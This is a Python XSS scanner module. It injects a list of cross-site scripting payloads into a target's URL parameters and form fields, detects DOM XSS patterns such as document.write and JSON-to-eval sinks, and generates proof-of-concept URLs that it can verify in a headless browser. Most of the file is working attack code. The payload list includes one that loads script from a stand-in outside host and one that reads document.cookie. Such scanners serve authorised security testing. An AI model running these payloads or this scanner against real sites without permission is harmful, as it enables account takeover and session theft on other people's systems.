#!/usr/bin/env python3
import httpx
import urllib.parse
from typing import List, Tuple, Dict
import re
import html as html_escape
from html.parser import HTMLParser
from .xss_payloads import XSSPayloads

# -----------------------------------------------------------------------------
# Browser verification (Playwright)
# -----------------------------------------------------------------------------

def verify_alert_with_playwright(url: str, timeout_s: int = 12, headers: Dict[str, str] = None) -> bool:
    """
    High-confidence verification by executing the page in a headless browser
    and checking for an alert dialog.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        log(f'Playwright not available for browser verification: {e}', 'WARN')
        return False

    try:
        triggered = {'dialog': False}
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(extra_http_headers=headers or None)
            page = context.new_page()

            def on_dialog(dialog):
                triggered['dialog'] = True
                try:
                    dialog.dismiss()
                except Exception:
                    pass

            page.on("dialog", on_dialog)
            page.goto(url, wait_until="domcontentloaded", timeout=timeout_s * 1000)
            page.wait_for_timeout(800)
            try:
                page.close()
            except Exception:
                pass
            try:
                context.close()
            except Exception:
                pass
            try:
                browser.close()
            except Exception:
                pass
        return bool(triggered['dialog'])
    except Exception as e:
        log(f'Playwright verification error: {str(e)[:120]}', 'DEBUG')
        return False

# Common XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    '"><svg onload=alert(1)>',
    "<svg/onload=alert('XSS')>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "javascript:alert('XSS')",
    "javascript:alert(document.cookie)",
    "<script>alert(document.domain)</script>",
    "<img src='x' onerror='alert(1)'>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<SCRIPT SRC=http://xss.example.com/xss.js></SCRIPT>",
]
JSON_EVAL_DOM_BREAKOUT_PAYLOAD = '\\"-alert(1)}//'
JSON_EVAL_DOM_TECHNIQUE_ID = "dom_xss_json_eval_backslash_breakout"
JSON_EVAL_DOM_TECHNIQUE_NAME = "Backslash escape bypass in JSON-to-eval DOM flow"

class FormParser(HTMLParser):
    """Parse HTML to extract forms and their inputs"""
    
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.current_input = None
    
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        
        if tag == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'get').upper(),
                'id': attrs_dict.get('id', ''),
                'inputs': []
            }
        
        elif tag in ['input', 'textarea', 'select'] and self.current_form is not None:
            input_data = {
                'type': attrs_dict.get('type', 'text'),
                'name': attrs_dict.get('name', ''),
                'id': attrs_dict.get('id', ''),
                'value': attrs_dict.get('value', '')
            }
            if input_data['name']:  # Only add inputs with names
                self.current_form['inputs'].append(input_data)
    
    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None

def log(msg, level='INFO'):
    """Simple logging function"""
    print(f'[{level}] {msg}', flush=True)

def extract_forms(html_content: str) -> List[Dict]:
    """Extract all forms from HTML content"""
    parser = FormParser()
    try:
        parser.feed(html_content)
    except Exception as e:
        log(f'Error parsing HTML forms: {str(e)}', 'DEBUG')
    return parser.forms

def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Test for reflected XSS vulnerabilities by injecting payloads into URL parameters and forms.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing vulnerability details
    """
    vulnerabilities = []
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
            # First, get the page to extract forms
            initial_response = client.get(url)
            forms = extract_forms(initial_response.text)
            
            # Parse URL to extract query parameters
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Test URL parameters (GET)
            if not params:
                # If no parameters in URL, try common parameter names
                common_params = ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect', 'name']
                params = {param: ['test'] for param in common_params}
            
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Test GET parameters
            for param_name in params.keys():
                log(f'Testing XSS on GET parameter: {param_name}', 'INFO')
                
                for payload in XSS_PAYLOADS:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                    
                    try:
                        response = client.get(base_url, params=flat_params)
                        
                        if payload in response.text:
                            if is_xss_vulnerable(response.text, payload):
                                vuln = {
                                    'type': 'reflected_xss',
                                    'method': 'GET',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': str(response.url),
                                    'severity': 'high',
                                    'description': f'Reflected XSS found in GET parameter "{param_name}"'
                                }
                                vulnerabilities.append(vuln)
                                log(f'XSS FOUND: GET parameter {param_name} with payload: {payload[:50]}...', 'VULN')
                                break
                    
                    except httpx.TimeoutException:
                        log(f'Timeout testing {param_name}', 'WARN')
                        break
                    except Exception as e:
                        log(f'Error testing {param_name}: {str(e)[:100]}', 'DEBUG')
                        continue
            
            # Test forms (POST/GET based on form method)
            if forms:
                log(f'Found {len(forms)} form(s) to test', 'INFO')
                
                for form_idx, form in enumerate(forms):
                    if not form['inputs']:
                        continue
                    
                    form_action = form['action']
                    # Resolve relative form action URLs
                    if form_action:
                        form_url = urllib.parse.urljoin(url, form_action)
                    else:
                        form_url = url
                    
                    log(f'Testing form {form_idx + 1} ({form["method"]}) with {len(form["inputs"])} input(s)', 'INFO')
                    
                    # Test each input field in the form
                    for input_field in form['inputs']:
                        if input_field['type'] in ['submit', 'button', 'image']:
                            continue  # Skip non-data inputs
                        
                        field_name = input_field['name']
                        log(f'Testing form input: {field_name}', 'INFO')
                        
                        for payload in XSS_PAYLOADS:
                            # Build form data with payload in the tested field
                            form_data = {}
                            for inp in form['inputs']:
                                if inp['name'] == field_name:
                                    form_data[inp['name']] = payload
                                else:
                                    form_data[inp['name']] = inp['value'] or 'test'
                            
                            try:
                                if form['method'] == 'POST':
                                    response = client.post(form_url, data=form_data)
                                else:
                                    response = client.get(form_url, params=form_data)
                                
                                if payload in response.text:
                                    if is_xss_vulnerable(response.text, payload):
                                        vuln = {
                                            'type': 'reflected_xss',
                                            'method': form['method'],
                                            'parameter': field_name,
                                            'payload': payload,
                                            'url': form_url,
                                            'severity': 'high',
                                            'description': f'Reflected XSS found in {form["method"]} form input "{field_name}"'
                                        }
                                        vulnerabilities.append(vuln)
                                        log(f'XSS FOUND: {form["method"]} form input {field_name} with payload: {payload[:50]}...', 'VULN')
                                        break
                            
                            except httpx.TimeoutException:
                                log(f'Timeout testing form input {field_name}', 'WARN')
                                break
                            except Exception as e:
                                log(f'Error testing form input {field_name}: {str(e)[:100]}', 'DEBUG')
                                continue
    
    except Exception as e:
        log(f'XSS scanner error: {str(e)}', 'ERROR')
    
    return vulnerabilities

def test_dom_xss(url: str, timeout: int = 10, browser_verify: bool = False) -> List[Dict]:
    """
    Test for DOM-based XSS using concrete source-to-sink patterns.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing vulnerability details
    """
    vulnerabilities = []
    
    def _select_dom_payload(candidates: List[str]) -> str:
        # Prefer payloads without quotes and with svg tag when available
        no_quote = [p for p in candidates if "'" not in p and '"' not in p]
        svg_candidates = [p for p in no_quote if '<svg' in p.lower()]
        if svg_candidates:
            return svg_candidates[0]
        if no_quote:
            return no_quote[0]
        return candidates[0] if candidates else "<svg onload=alert(1)>"

    def _adaptive_prefix_variants(payload: str) -> List[str]:
        return [f'\">{payload}', f"'>{payload}"]

    def _merge_query(url_in: str, updates: Dict[str, str]) -> str:
        """
        Preserve existing query parameters while injecting/overriding one parameter.
        This matters for pages where the sink only exists on specific parameterized endpoints.
        """
        try:
            parsed = urllib.parse.urlparse(url_in)
            existing = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            # Flatten to single value per key for URL generation.
            flat = {k: (v[0] if isinstance(v, list) and v else "") for k, v in existing.items()}
            for k, v in (updates or {}).items():
                flat[k] = v
            new_query = urllib.parse.urlencode(flat, doseq=False)
            return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
        except Exception:
            # Fallback: last resort, drop existing query (older behavior).
            base = url_in.split("#")[0].split("?")[0]
            return f"{base}?{urllib.parse.urlencode(updates or {})}"

    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
            response = client.get(url)
            
            # DOM XSS proof-of-concept for common URLSearchParams + document.write patterns
            # NOTE: Keep these regexes simple. Over-escaping `\(` / `\)` in raw strings
            # creates patterns like `\\)` which compile as a literal backslash + unmatched `)`.
            param_match = re.search(
                r'URLSearchParams\(\s*(?:window\.)?location\.search\s*\)\s*\)\s*\.get\(\s*["\']([^"\']+)["\']\s*\)',
                response.text,
                re.IGNORECASE
            )
            var_match = re.search(
                r'\b(?:var|let|const)\s+(\w+)\s*=\s*\(?\s*new\s+URLSearchParams\(\s*(?:window\.)?location\.search\s*\)\s*\)?\.get\(\s*["\']([^"\']+)["\']\s*\)',
                response.text,
                re.IGNORECASE
            )
            if param_match or var_match:
                param_name = param_match.group(1) if param_match else var_match.group(2)
                var_name = var_match.group(1) if var_match else None
                write_sink = re.search(
                    r'document\.write\s*\([^)]*' + re.escape(var_name or '') + r'[^)]*\)',
                    response.text,
                    re.IGNORECASE | re.DOTALL
                ) if var_name else None

                # Also handle the direct case: document.write(... URLSearchParams(...).get('search') ...)
                direct_sink = re.search(
                    r'document\.write\s*\([^)]*URLSearchParams\(\s*(?:window\.)?location\.search\s*\)[^)]*\.get\(\s*["\']' + re.escape(param_name) + r'["\']\s*\)[^)]*\)',
                    response.text,
                    re.IGNORECASE | re.DOTALL
                )

                if write_sink or direct_sink:
                    candidates = XSSPayloads.HTML_CONTEXT + XSSPayloads.EVENT_HANDLERS
                    payload = _select_dom_payload(candidates)
                    variants = _adaptive_prefix_variants(payload)

                    for variant in variants:
                        poc_url = _merge_query(url, {param_name: variant})
                        verified = False
                        if browser_verify:
                            log(f"Verifying DOM XSS in headless browser: {poc_url}", 'INFO')
                            verified = verify_alert_with_playwright(poc_url)
                            log(f"DOM XSS browser verification result: {verified}", 'INFO')
                        vuln = {
                            'type': 'dom_xss',
                            'pattern': 'document.write + URLSearchParams(location.search)',
                            'parameter': param_name,
                            'payload': variant,
                            'url': poc_url,
                            'severity': 'high',
                            'description': f'DOM XSS via {param_name} in document.write sink',
                            'exploitation': {
                                'browser_steps': [
                                    f"Open: {poc_url}",
                                    "Observe that the payload executes in the browser",
                                ]
                            }
                        }
                        if browser_verify:
                            vuln['verified'] = verified
                            vuln['severity'] = 'high' if verified else 'medium'
                            vuln['description'] = vuln['description'] + (" (verified)" if verified else " (not verified)")
                        vulnerabilities.append(vuln)
                        log(f'DOM XSS PoC generated for parameter {param_name}', 'VULN')
                        break

            # Technique: query parameter reflected into JSON data that is later evaluated with eval().
            try:
                script_refs = re.findall(
                    r'<script[^>]+src=["\']([^"\']+)["\']',
                    response.text or "",
                    re.IGNORECASE,
                )
                candidates = []
                for s in script_refs[:12]:
                    script_url = urllib.parse.urljoin(str(response.url), s)
                    p = urllib.parse.urlparse(script_url)
                    if p.scheme not in ("http", "https"):
                        continue
                    if p.netloc != urllib.parse.urlparse(str(response.url)).netloc:
                        continue
                    candidates.append(script_url)

                has_eval_json_flow = False
                flow_params: List[str] = []
                for script_url in candidates:
                    try:
                        script_resp = client.get(script_url)
                    except Exception:
                        continue
                    js_body = script_resp.text or ""
                    if not re.search(r'\beval\s*\(', js_body, re.IGNORECASE):
                        continue
                    has_json_hint = bool(
                        re.search(r'\bJSON\.parse\s*\(|\bapplication/json\b|\.json\s*\(', js_body, re.IGNORECASE)
                    )
                    has_data_fetch = bool(
                        re.search(r'\bfetch\s*\(|XMLHttpRequest|\.open\s*\(\s*[\'\"]GET[\'\"]', js_body, re.IGNORECASE)
                    )
                    if has_json_hint or has_data_fetch:
                        has_eval_json_flow = True
                    flow_params.extend(
                        re.findall(
                            r'URLSearchParams\(\s*(?:window\.)?location\.search\s*\)\.get\(\s*[\'"]([^\'"]+)[\'"]\s*\)',
                            js_body,
                            re.IGNORECASE,
                        )
                    )

                if has_eval_json_flow:
                    param_candidates = [p for p in dict.fromkeys(flow_params) if p]
                    if not param_candidates:
                        param_candidates = ["search", "q", "query", "keyword", "term"]
                    for pname in param_candidates[:3]:
                        poc_url = _merge_query(url, {pname: JSON_EVAL_DOM_BREAKOUT_PAYLOAD})
                        verified = False
                        if browser_verify:
                            log(f"Verifying JSON/eval DOM XSS in headless browser: {poc_url}", "INFO")
                            verified = verify_alert_with_playwright(poc_url)
                            log(f"JSON/eval DOM XSS browser verification result: {verified}", "INFO")

                        vuln = {
                            "type": "dom_xss",
                            "pattern": "query-parameter -> JSON data -> eval()",
                            "parameter": pname,
                            "payload": JSON_EVAL_DOM_BREAKOUT_PAYLOAD,
                            "url": poc_url,
                            "severity": "high" if verified else "medium",
                            "technique_id": JSON_EVAL_DOM_TECHNIQUE_ID,
                            "technique_name": JSON_EVAL_DOM_TECHNIQUE_NAME,
                            "description": "Potential DOM XSS via backslash escape bypass in JSON data evaluated with eval()" + (" (verified)" if verified else " (pattern matched, not browser-verified)"),
                            "exploitation": {
                                "browser_steps": [
                                    f"Open: {poc_url}",
                                    "Observe an alert dialog if the payload executes in the eval() flow.",
                                ]
                            },
                            "verified": bool(verified),
                        }
                        vulnerabilities.append(vuln)
                        log("DOM XSS JSON/eval technique PoC generated", "VULN")
                        if verified:
                            break
            except Exception:
                pass
    
    except Exception as e:
        log(f'DOM XSS scanner error: {str(e)}', 'ERROR')
    
    return vulnerabilities

def _is_in_comment(text: str, idx: int) -> bool:
    if idx < 0:
        return False
    last_open = text.rfind("<!--", 0, idx)
    last_close = text.rfind("-->", 0, idx)
    return last_open != -1 and last_open > last_close


def _is_inside_tag(text: str, idx: int, tag: str) -> bool:
    open_idx = text.rfind(f"<{tag}", 0, idx)
    if open_idx == -1:
        return False
    close_idx = text.rfind(f"</{tag}>", 0, idx)
    return close_idx < open_idx


def _is_in_attribute(text: str, payload: str) -> bool:
    attr_pattern = r'<[^>]+\s+[^\s=]+\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
    return re.search(attr_pattern, text, re.IGNORECASE | re.DOTALL) is not None


def _guess_reflection_context(text: str, payload: str) -> str:
    idx = text.find(payload)
    if idx == -1:
        return 'unknown'
    if _is_in_comment(text, idx):
        return 'comment'
    if _is_inside_tag(text, idx, "script"):
        return 'javascript'
    if _is_inside_tag(text, idx, "style"):
        return 'css'
    if _is_in_attribute(text, payload):
        return 'attribute'
    left = text.rfind(">", 0, idx)
    right = text.find("<", idx + len(payload))
    if left != -1 and right != -1 and left < idx < right:
        return 'html'
    return 'unknown'


def _is_reflected_unescaped(response_text: str, payload: str) -> bool:
    # If the raw payload is present anywhere, we consider it unescaped enough to analyze.
    # Some pages reflect both raw and escaped variants; rejecting on escaped presence creates false negatives.
    return payload in response_text


def is_xss_vulnerable(response_text: str, payload: str) -> bool:
    """
    Conservative vulnerability detection to reduce false positives.
    """
    if not _is_reflected_unescaped(response_text, payload):
        return False

    actual_context = _guess_reflection_context(response_text, payload)
    if actual_context == 'comment':
        return False

    payload_lower = payload.lower()
    if any(keyword in payload_lower for keyword in ['<script', '</script', 'onerror', 'onload', 'onmouseover', 'onclick', 'javascript:']):
        return True
    if actual_context == 'javascript' and any(token in payload_lower for token in ['alert(', 'confirm(', 'prompt(', 'fetch(', 'document.']):
        return True
    if actual_context == 'attribute' and any(token in payload_lower for token in ['onerror', 'onload', 'onmouseover', 'onclick', 'javascript:']):
        return True
    if actual_context == 'html' and any(tag in payload_lower for tag in ['<img', '<svg', '<iframe', '<script', '</script']):
        return True

    return False

def check_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Main XSS checking function that runs all XSS tests.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing all XSS vulnerabilities found
    """
    log(f'Running XSS scanner on {url}', 'INFO')
    
    all_vulnerabilities = []
    
    # Test for reflected XSS (GET params and forms)
    reflected_vulns = test_reflected_xss(url, timeout)
    all_vulnerabilities.extend(reflected_vulns)
    
    # Test for DOM-based XSS patterns
    dom_vulns = test_dom_xss(url, timeout)
    all_vulnerabilities.extend(dom_vulns)
    
    if all_vulnerabilities:
        log(f'Found {len(all_vulnerabilities)} XSS vulnerability(ies) on {url}', 'VULN')
    else:
        log(f'No XSS vulnerabilities found on {url}', 'INFO')
    
    return all_vulnerabilities
